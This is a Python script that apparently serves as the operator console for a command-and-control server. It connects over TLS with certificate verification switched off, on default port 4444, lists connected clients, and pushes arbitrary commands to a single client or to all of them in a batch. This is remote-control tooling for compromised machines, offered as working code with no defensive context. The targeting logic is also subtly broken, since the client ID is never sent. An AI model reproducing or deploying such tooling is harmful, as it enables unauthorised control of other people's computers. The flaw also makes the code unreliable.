import socket
import ssl
import uuid
import json
import time

def connect_to_server(server_ip, port=4444):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = context.wrap_socket(sock, server_hostname=server_ip)
    ssl_sock.connect((server_ip, port))
    return ssl_sock

def send_command(sock, cmd, client_id=None):
    response_id = str(uuid.uuid4())
    full_cmd = f"{cmd}:{response_id}" if not cmd.startswith("list_clients") else cmd
    sock.send(full_cmd.encode())
    response = sock.recv(16384).decode()
    if response.startswith(f"{response_id}:"):
        return response[len(response_id) + 1:]
    return response

def main():
    server_ip = input("Enter server IP: ")
    port = int(input("Enter server port (default 4444): ") or 4444)
    
    try:
        sock = connect_to_server(server_ip, port)
        print(f"[*] Connected to server {server_ip}:{port}")
        
        while True:
            print("\nCommands: list_clients, send <client_id> <command>, batch <command>, exit")
            action = input("Enter action: ").strip()
            
            if action == "exit":
                break
            elif action == "list_clients":
                response = send_command(sock, "list_clients")
                print(f"[*] Connected clients:\n{response}")
            elif action.startswith("send "):
                try:
                    _, client_id, cmd = action.split(" ", 2)
                    response = send_command(sock, cmd, client_id)
                    print(f"[*] Response from {client_id}:\n{response}")
                except ValueError:
                    print("[!] Usage: send <client_id> <command>")
            elif action.startswith("batch "):
                try:
                    cmd = action.split(" ", 1)[1]
                    clients = send_command(sock, "list_clients").split("\n")
                    for client_id in clients:
                        if client_id:
                            response = send_command(sock, cmd, client_id)
                            print(f"[*] Response from {client_id}:\n{response}")
                            time.sleep(0.1)
                except Exception as e:
                    print(f"[!] Error in batch command: {e}")
            else:
                print("[!] Unknown action")
                
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()